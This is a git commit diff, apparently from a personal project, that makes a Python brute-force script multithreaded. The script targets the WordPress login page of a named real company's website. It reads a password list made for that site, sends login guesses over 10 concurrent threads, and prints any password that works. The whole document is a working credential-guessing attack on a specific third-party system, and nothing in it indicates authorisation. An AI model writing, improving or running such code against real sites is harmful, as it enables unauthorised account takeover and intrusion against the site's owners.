165113359b43c1e9b06166ed5f6a491ce1aa8cef
MrWatchman <joaooli17@hotmail.com>
2023-06-01 16:57:30 -0300

    Deixando mult thread

--- bruteforce.py
+++ bruteforce.py
@@ -2,17 +2,16 @@ import requests
 import sys
 import time
 from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
 
 url = "https://www.gtfoods.com.br/wp-login.php"
 username = input("Enter the username: ")
 error = input("Enter the login failed string: ")
 
 z = """
-
     [*]-------------------------[*]
         Verificando servidor...
     [*]-------------------------[*]
-
 """
 
 for c in z:
@@ -20,31 +19,36 @@ for c in z:
     sys.stdout.flush()
     time.sleep(0.01)
 
+def brute(password):
+    count = 0
+    print("\033[1;31m"+"[-] tentativa número [" + str(count) + "] LOGIN: " + username + " / SENHA: " + password)
+    data_dict = {"user": username, "password": password}
+    
+    try:
+        res = requests.post(url, data=data_dict)
+        soup = BeautifulSoup(res.content, 'html.parser')
+        div_login_error = soup.find("div", id="login_error")
+
+        if div_login_error:
+            pass
+        else:
+            print("\033[1;32m"+"[+] senha encontrada --> " + password)
+            return password
+
+    except requests.exceptions.ConnectionError:
+        print("\033[1;31m"+"[-] erro na conexão com o servidor")
+        return None
+
 try:
-    def brute(username, url, error):
-        count = 0
-        for password in passwords:
-            count += 1
-            password = password.strip()
-            print("\033[1;31m"+"[-] tentativa número [" + str(count) + "] LOGIN: " + username + " / SENHA: " + password)
-            data_dict = {"user": username, "password": password}
-            
-            try:
-                res = requests.post(url, data=data_dict)
-                soup = BeautifulSoup(res.content, 'html.parser')
-                div_login_error = soup.find("div", id="login_error")
+    with open("gtfoods.txt", "r") as passwords_file:
+        passwords = [password.strip() for password in passwords_file]
 
-                if div_login_error:
-                    pass
-                else:
-                    print("\033[1;32m"+"[+] senha encontrada --> " + password)
-                    exit()
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            results = executor.map(brute, passwords)
 
-            except requests.exceptions.ConnectionError:
-                print("\033[1;31m"+"[-] erro na conexão com o servidor")
-                exit()
+            for result in results:
+                if result is not None:
+                    break
 
 except:
     print("\033[1;31m"+"[-] erro na conexão com o servidor")
-with open("gtfoods.txt", "r") as passwords:
-    brute(username, url, error)
